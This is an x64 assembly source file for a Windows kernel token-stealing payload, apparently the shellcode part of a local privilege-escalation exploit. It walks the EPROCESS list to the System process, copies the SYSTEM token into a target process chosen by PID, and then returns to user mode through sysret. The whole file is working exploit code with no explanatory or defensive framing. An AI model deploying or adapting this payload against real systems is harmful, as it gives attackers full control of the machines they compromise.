SECTION .start_magic     
db "magic1" 


SECTION .text
;db 0xcc

start:
	xor rax, rax
	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field
	mov rax, [rax+0xb8]		; Get (KAPC_STATE)ApcState.Process (our EPROCESS)
	mov r9, rax;			; Backup target EPROCESS at r9
	
	; loop processes list
	mov rax, [rax + 0x2e8]	; +0x2e8 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link
	mov rax, [rax]			; Follow the first link
system_process_loop:
	mov rdx, [rax - 0x8]	; ProcessId
	mov r8, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8
	mov rax, [rax]			; Next process
	cmp rdx, 4			; System PID
	jnz system_process_loop
	
target_process_loop:
	mov r11, [rax - 0x8]	; ProcessId
	mov r10, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8
	mov rax, [rax]			; Next process
	cmp r11, 1337			; Parent's PID. This is initialized by the exploit itself beforehand
	jnz target_process_loop
	
	mov rdx, [r8 + 0x70]
	and rdx, 0xfffffffffffffff8			; Ignore ref count
	sub r10, 0x2e8;
	mov rcx, [r10 + 0x358]
	and rcx, 0x7
	add rdx, rcx				; put target's ref count into our token
	mov [r10 + 0x358], rdx		; rdx = system token
	
	;db 0xcc
ret_to_usermode:
	;sti
	mov rax, [gs:0x188]		; _KPCR.Prcb.CurrentThread
	mov cx, [rax + 0x1e4]		; KTHREAD.KernelApcDisable
	xor cx, cx				; Reset it
	mov [rax + 0x1e4], cx
	mov rdx, [rax + 0x90] 	; ETHREAD.TrapFrame
	mov rcx, [rdx + 0x168]	; ETHREAD.TrapFrame.Rip
	mov r11, [rdx + 0x178]	; ETHREAD.TrapFrame.EFlags
	mov rsp, [rdx + 0x180]	; ETHREAD.TrapFrame.Rsp
	mov rbp, [rdx + 0x158]	; ETHREAD.TrapFrame.Rbp
	;db 0xcc
	xor eax, eax 	
	swapgs
	o64 sysret	; nasm shit
	
	
SECTION .end_magic     
db "magic2" 

	